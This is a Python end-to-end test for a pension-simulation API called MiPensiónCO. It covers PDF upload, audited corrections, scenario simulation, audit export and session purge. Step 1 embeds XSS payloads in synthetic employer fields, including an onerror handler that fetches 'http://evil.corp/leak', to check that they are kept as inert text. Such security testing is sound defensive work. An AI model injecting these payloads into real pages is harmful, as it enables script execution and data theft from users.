"""End-to-End Comprehensive Workflow Test for MiPensiónCO.

Directly verifies the 10 mandatory integration steps from Section 5:
1. Load a synthetic multi-page PDF.
2. Inspect raw original text and parsed/uninterpreted fragments.
3. Correct a field with an audited reason.
4. Evaluate transition regime.
5. Simulate 2 distinct scenarios with different IBC and pause periods.
6. Inspect end-to-end traceability for each result.
7. Export full audit and verify original rows, corrections, assumptions, and operations.
8. Save audit locally via explicit consent (atomic, no original PDF saved).
9. Delete session and selected persisted audit.
10. Verify no state remains in memory and targeted files are removed.

Includes synthetic malicious HTML / XSS payload verification.
"""

import io
import json
from decimal import Decimal
from pathlib import Path

from starlette.testclient import TestClient

from src.api.app import app
from src.audit.service import AUDIT_DIR, AuditService
from src.parser.synthetic_generator import create_synthetic_colpensiones_pdf

client = TestClient(app)


def test_full_10_step_e2e_workflow():
    """Executes the complete 10-step lifecycle and verifies all security/audit guarantees."""

    # -------------------------------------------------------------------------
    # Step 1: Load a synthetic multi-page PDF with malicious HTML markers
    # -------------------------------------------------------------------------
    malicious_employer = "<script>alert('XSS_ATTACK')</script> EMPRESA S.A.S."
    malicious_note = "<img src='x' onerror='fetch(\"http://evil.corp/leak\")'/> Nota"

    # Multi-page PDF (page 1 + page 2)
    pdf_bytes = create_synthetic_colpensiones_pdf(
        fecha_nacimiento="15/05/1972",  # Turns 62 in 2034
        sexo="MASCULINO",
        total_semanas="950.00",
        fecha_expedicion="15/08/2025",
        records_lines=[
            f"01/01/2024 31/01/2024 30 $ 3.000.000 {malicious_employer}",
            f"01/02/2024 29/02/2024 30 $ 3.200.000 EMPRESA NORMAL - {malicious_note}",
            "01/03/2024 31/03/2024 30 $ 3.200.000 EMPRESA NORMAL",
        ],
    )

    upload_res = client.post(
        "/api/upload",
        files={"file": ("historia_e2e.pdf", io.BytesIO(pdf_bytes), "application/pdf")},
    )
    assert upload_res.status_code == 200
    upload_data = upload_res.json()
    assert upload_data["success"] is True
    exec_id = upload_data["report"]["execution_id"]
    assert exec_id is not None

    # Verify that malicious HTML tags are preserved as safe literal strings (Finding A & 2.9)
    records = upload_data["data"]["registros"]
    assert len(records) >= 3
    assert "<script>alert('XSS_ATTACK')</script>" in records[0]["aportante"]
    assert "<img" in records[1]["aportante"]

    # -------------------------------------------------------------------------
    # Step 2: Review original raw text and interpreted fragments
    # -------------------------------------------------------------------------
    audit_res = client.get(f"/api/audit/{exec_id}")
    assert audit_res.status_code == 200
    audit_data = audit_res.json()

    assert audit_data["execution_id"] == exec_id
    assert len(audit_data["pages_audit"]) >= 1
    page1 = audit_data["pages_audit"][0]
    assert len(page1["raw_page_text"]) > 0, (
        "Raw unnormalized page text must be preserved"
    )
    assert len(page1["fragments"]) > 0, (
        "Fragments with IDs and coordinates must be preserved"
    )
    first_frag = page1["fragments"][0]
    assert "fragment_id" in first_frag
    assert "status" in first_frag
    assert first_frag["status"] in (
        "INTERPRETADO",
        "RECHAZADO",
        "AMBIGUO",
        "PENDIENTE",
        "NO_COTIZACION",
    )

    # -------------------------------------------------------------------------
    # Step 3: Correct a field with an audited reason
    # -------------------------------------------------------------------------
    correction_payload = {
        "execution_id": exec_id,
        "target_field": "registros[0].ibc",
        "original_value": "3000000",
        "corrected_value": "3500000",
        "reason": "Corrección manual por planilla PILA adjunta soporte",
    }
    corr_res = client.post("/api/audit/correction", json=correction_payload)
    assert corr_res.status_code == 200
    corr_data = corr_res.json()
    assert corr_data["success"] is True
    assert (
        corr_data["correction"]["reason"]
        == "Corrección manual por planilla PILA adjunta soporte"
    )

    # Verify correction was saved in audit
    audit_res_after_corr = client.get(f"/api/audit/{exec_id}")
    assert len(audit_res_after_corr.json()["user_corrections"]) == 1
    assert audit_res_after_corr.json()["user_corrections"][0]["order"] == 1

    # -------------------------------------------------------------------------
    # Step 4: Evaluate transition regime
    # -------------------------------------------------------------------------
    historia_dict = upload_data["data"]
    # Update field based on user correction
    historia_dict["registros"][0]["ibc"] = 3500000.0

    eval_res = client.post(
        f"/api/evaluate-transition?execution_id={exec_id}",
        json=historia_dict,
    )
    assert eval_res.status_code == 200
    eval_data = eval_res.json()
    assert eval_data["status"] == "EVIDENCIA_SUFICIENTE_CUMPLIMIENTO"
    assert eval_data["permite_continuar_simulacion"] is True
    assert eval_data["umbral_exigido"] == 900

    # Verify transition evaluation was recorded in audit
    audit_res_after_eval = client.get(f"/api/audit/{exec_id}")
    assert "threshold_required" in audit_res_after_eval.json()["transition_audit"]
    assert audit_res_after_eval.json()["transition_audit"]["threshold_required"] == 900

    # -------------------------------------------------------------------------
    # Step 5: Simulate two scenarios with different IBC and pause periods
    # -------------------------------------------------------------------------
    simulate_payload = {
        "execution_id": exec_id,
        "historia": historia_dict,
        "escenarios": [
            {
                "escenario_id": "esc_conservador",
                "nombre": "Conservador 2 SMLMV",
                "ibc_futuro_inicial": 3500000.0,
                "fecha_inicio_ibc": "2026-01-01",
                "crecimiento_anual_nominal": 0.04,
                "periodos_sin_aporte": [
                    ["2027-03-01", "2027-03-15"]  # 15-day partial pause
                ],
                "supuesto_inflacion": 0.04,
                "supuesto_crecimiento_smlmv": 0.05,
            },
            {
                "escenario_id": "esc_optimista",
                "nombre": "Optimista 6 SMLMV",
                "ibc_futuro_inicial": 10500000.0,
                "fecha_inicio_ibc": "2026-01-01",
                "crecimiento_anual_nominal": 0.06,
                "periodos_sin_aporte": [],
                "supuesto_inflacion": 0.04,
                "supuesto_crecimiento_smlmv": 0.05,
            },
        ],
    }

    sim_res = client.post("/api/simulate", json=simulate_payload)
    assert sim_res.status_code == 200
    sim_data = sim_res.json()
    assert len(sim_data["results"]) == 2

    res_cons = sim_data["results"][0]
    res_opt = sim_data["results"][1]

    assert res_cons["cumple_semanas"] is True
    assert res_opt["cumple_semanas"] is True
    assert res_opt["ibl_final"] > res_cons["ibl_final"], (
        "Higher future IBC must produce higher IBL"
    )
    assert res_opt["mesada_bruta"] > res_cons["mesada_bruta"], (
        "Higher future IBC must produce higher mesada"
    )

    # -------------------------------------------------------------------------
    # Step 6: Inspect end-to-end traceability for each result
    # -------------------------------------------------------------------------
    audit_res_after_sim = client.get(f"/api/audit/{exec_id}")
    scenarios_audit = audit_res_after_sim.json()["scenarios_audit"]
    assert len(scenarios_audit) == 2

    for sc_audit in scenarios_audit:
        assert sc_audit["generated_future_periods_count"] > 0
        assert len(sc_audit["effective_contributions_selected"]) > 0
        assert Decimal(sc_audit["weeks_breakdown"]["documentales"]) == Decimal("950.00")
        assert Decimal(sc_audit["weeks_breakdown"]["totales"]) >= Decimal("1300.00")
        assert len(sc_audit["step_by_step_operations"]) >= 5
        # Verify decimal string serialization
        assert isinstance(sc_audit["gross_pension"], str)
        assert isinstance(sc_audit["ibl_final"], str)
        assert isinstance(sc_audit["smlmv_ref"], str)

    # -------------------------------------------------------------------------
    # Step 7: Export audit and verify original rows, corrections, assumptions, and ops
    # -------------------------------------------------------------------------
    export_res = client.get(f"/api/audit/{exec_id}/export")
    assert export_res.status_code == 200
    assert "attachment" in export_res.headers.get("content-disposition", "")
    exported_json = export_res.json()

    assert exported_json["schema_version"] == "2.1.0"
    assert len(exported_json["pages_audit"]) >= 1
    assert len(exported_json["user_corrections"]) == 1
    assert len(exported_json["scenarios_audit"]) == 2
    assert "threshold_required" in exported_json["transition_audit"]

    # Also verify Markdown diagnostic report
    md_res = client.get(f"/api/audit/{exec_id}/report.md")
    assert md_res.status_code == 200
    md_text = md_res.text
    assert "Auditoría Detallada" in md_text
    assert "Conservador 2 SMLMV" in md_text
    assert "Optimista 6 SMLMV" in md_text

    # -------------------------------------------------------------------------
    # Step 8: Save audit locally via explicit consent (atomic, no PDF saved)
    # -------------------------------------------------------------------------
    save_res = client.post(
        f"/api/audit/{exec_id}/save-local?enable_sensitive_save=true"
    )
    assert save_res.status_code == 200
    save_data = save_res.json()
    assert save_data["success"] is True

    persisted_file = Path(save_data["file_path"])
    assert persisted_file.exists(), (
        f"Persisted file {persisted_file} must exist on disk"
    )
    with open(persisted_file, "r", encoding="utf-8") as f:
        persisted_content = json.load(f)
    assert persisted_content["execution_id"] == exec_id
    # Crucial security guarantee: Original binary PDF is NEVER written or saved
    assert not (AUDIT_DIR / f"{exec_id}.pdf").exists()

    # -------------------------------------------------------------------------
    # Step 9: Delete session and selected persisted audit
    # -------------------------------------------------------------------------
    purge_res = client.post(
        f"/api/reset-session?execution_id={exec_id}&delete_persisted_audit=true"
    )
    assert purge_res.status_code == 200
    assert purge_res.json()["status"] == "SESSION_CLEARED"

    # -------------------------------------------------------------------------
    # Step 10: Verify no state remains in memory and targeted files are removed
    # -------------------------------------------------------------------------
    # Verify disk file was deleted
    assert not persisted_file.exists(), (
        f"Persisted file {persisted_file} must be removed after purge"
    )

    # Verify memory state for this execution was reset
    post_purge_audit = AuditService.get_or_create_audit(exec_id)
    assert len(post_purge_audit.scenarios_audit) == 0
    assert len(post_purge_audit.user_corrections) == 0
    assert len(post_purge_audit.pages_audit) == 0
